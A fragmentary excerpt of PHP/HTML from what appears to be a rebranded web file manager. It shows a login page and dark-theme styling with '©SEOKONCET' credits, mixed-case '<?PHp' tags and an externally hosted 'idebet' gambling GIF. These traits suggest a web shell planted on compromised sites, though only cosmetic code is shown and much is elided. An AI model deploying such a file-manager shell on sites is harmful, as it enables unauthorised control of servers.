...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;SEOKONCET</a></div>
        <?PHp else: ?>
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;SEOKONCET</a></div>
        <?PHp endif; ?>
    </div>
...
<head>
    ...
    <style>
        ...
        body.fm-login-page.theme-dark {background-color: #deb400;}
...
<head>
    ...
    if (FM_THEME == "dark"): ?>
        <style>
            ...
            body.theme-dark { background-image: url(https://ik.imagekit.io/expx/idebet-en.gif?updatedAt=1750964286413); }
